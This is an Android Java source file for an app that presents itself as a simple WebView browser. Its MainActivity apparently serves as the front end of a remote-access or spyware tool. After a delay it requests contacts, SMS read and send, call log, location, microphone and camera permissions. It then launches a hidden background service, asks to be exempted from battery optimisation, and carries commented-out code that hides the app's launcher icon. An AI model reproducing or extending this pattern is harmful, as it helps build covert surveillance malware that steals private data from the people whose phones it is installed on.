package com.velociraptor.raptor;

import android.Manifest;
import android.app.ActivityManager;
import android.app.DownloadManager;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.DownloadManager;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.webkit.CookieManager;
import android.webkit.DownloadListener;
import android.webkit.MimeTypeMap;
import android.webkit.URLUtil;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.appcompat.app.AppCompatActivity;

import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;

import java.util.List;
import java.util.concurrent.TimeUnit;

import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers;
import io.reactivex.rxjava3.core.Flowable;
import io.reactivex.rxjava3.schedulers.Schedulers;
import io.reactivex.rxjava3.subscribers.DisposableSubscriber;

public class MainActivity extends AppCompatActivity {
    private WebView webView;
    private String sFileName,sUrl,sUserAgent;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        init();
        webView = findViewById(R.id.webview);
        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient());
        webView.getSettings().setJavaScriptEnabled(true);
        webView.loadUrl("https://google.com");


        webView.setDownloadListener(new DownloadListener() {
            @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)

            public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimetype, long contentLength) {
                String filename = URLUtil.guessFileName(url,contentDisposition,getFileType(url));
                sFileName = filename;
                sUrl = url;
                sUserAgent = userAgent;
                if (Build.VERSION.SDK_INT>=Build.VERSION_CODES.M){
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                            == PackageManager.PERMISSION_GRANTED){
                        downloadFile(filename,url,userAgent);
                    }else {
                        requestPermissions(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},1001);
                    }
                }else {
                    downloadFile(filename,url,userAgent);
                }
            }
        });
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
    private void downloadFile(String filename, String url, String userAgent) {
        try {
            String cookie = CookieManager.getInstance().getCookie(url);
            DownloadManager downloadManager = (DownloadManager)getSystemService(DOWNLOAD_SERVICE);
            DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
            request.setTitle(filename)
                    .setDescription("Downloading...")
                    .addRequestHeader("cookie",cookie)
                    .addRequestHeader("User-Agent",userAgent)
                    .setMimeType(getFileType(url))
                    .setAllowedOverMetered(true)
                    .setAllowedOverRoaming(true)
                    .setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE|
                            DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
            downloadManager.enqueue(request);
            Toast.makeText(this, "Download Started", Toast.LENGTH_SHORT).show();

            sUrl = "";
            sFileName = "";
            sUserAgent = "";
        }catch (Exception ignored){
            Toast.makeText(this, ignored.toString(), Toast.LENGTH_SHORT).show();
        }
    }

    private String getFileType(String url){
        ContentResolver contentResolver = getContentResolver();
        MimeTypeMap mimeTypeMap = MimeTypeMap.getSingleton();
        return mimeTypeMap.getExtensionFromMimeType(contentResolver.getType(Uri.parse(url)));
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)

    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode==1001){
            if (grantResults.length>0&&grantResults[0]==PackageManager.PERMISSION_GRANTED){
                if (!sUrl.equals("")&&!sFileName.equals("")&&!sUserAgent.equals("")){
                    downloadFile(sFileName,sUrl,sUserAgent);
                }
            }
        }


         //for newer version, use download manager from sdk




    }


    private void init() {
        Flowable.timer(5, TimeUnit.SECONDS)
                .observeOn(AndroidSchedulers.mainThread())
                .subscribeOn(Schedulers.io())
                .subscribe(subscriberDelay);


    }


    private DisposableSubscriber<Long> subscriberDelay = new DisposableSubscriber<Long>() {
        @Override
        public void onNext(Long aLong) {

        }

        @Override
        public void onError(Throwable t) {

        }

        @Override
        public void onComplete() {
            checkPermission();
        }
    };

    private void runBackground() {

        Intent serviceIntent = new Intent(getApplicationContext(), InternalService.class);

        if (!isMyServiceRunning(InternalService.class)) {
            startService(serviceIntent);
        } else {
            stopService(new Intent(getApplicationContext(), InternalService.class));
            init();
        }

/*
        PackageManager p = getPackageManager();
        p.setComponentEnabledSetting(getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);

*/
    }

    private void checkPermission() {
        Dexter.withContext(getApplicationContext())
                .withPermissions(
                        Manifest.permission.INTERNET,
                        Manifest.permission.READ_PHONE_STATE,
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.READ_CONTACTS,
                        Manifest.permission.WRITE_CONTACTS,
                        Manifest.permission.READ_SMS,
                        Manifest.permission.SEND_SMS,
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_COARSE_LOCATION,
                        Manifest.permission.READ_CALL_LOG,
                        Manifest.permission.RECORD_AUDIO,
                        Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Manifest.permission.CAMERA
                ).withListener(new MultiplePermissionsListener() {
            @Override
            public void onPermissionsChecked(MultiplePermissionsReport report) {
                if (report.areAllPermissionsGranted()) {
                    runBackground();
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    Intent intent = new Intent();
                    String packageName = getPackageName();
                    PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                    if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                        intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                        intent.setData(Uri.parse("package:" + packageName));
                        startActivity(intent);
                    }
                }
            }

            @Override
            public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {/* ... */}
        }).check();
    }

    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();

        } else {
            super.onBackPressed();
        }

    }
}
